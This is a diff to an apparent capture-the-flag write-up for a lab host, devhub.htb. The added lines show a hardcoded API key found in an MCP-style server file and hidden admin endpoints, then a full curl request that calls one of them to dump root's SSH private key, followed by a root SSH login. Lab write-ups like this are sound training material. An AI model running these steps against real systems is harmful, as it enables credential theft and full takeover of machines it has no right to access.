@@ -52,4 +52,18 @@
       
      	 `-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 /opt/opsmcp/server.py`
 
-- token extraction: `server.py` contained VALID_API_KEY = "opsmcp_secret_key_4fXXXXXXXXXXXXXX"
+- file examination: `server.py` contained
+  	- `VALID_API_KEY = "opsmcp_secret_key_4fXXXXXXXXXXXXXX"`
+  	-  Hidden endpoints `ops._admin_dump`, `ops._debug_mode` that weren't in the visible tool list
+  	-  The `ops._admin_dump` handler could read `/root/.ssh/id_rsa`
+ 
+- exploitation:
+
+		curl -s http://127.0.0.1:5000/tools/call \
+		  -H "X-API-Key: opsmcp_secret_key_4fXXXXXXXXXXXXXX" \
+		  -H "Content-Type: application/json" \
+		  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
+
+  request returned `root`'s private ssh key, leading to full system compromise.
+- connecting via ssh using dumped key: `ssh -i key root@devhub.htb`
+- `/root/root.txt` extraction
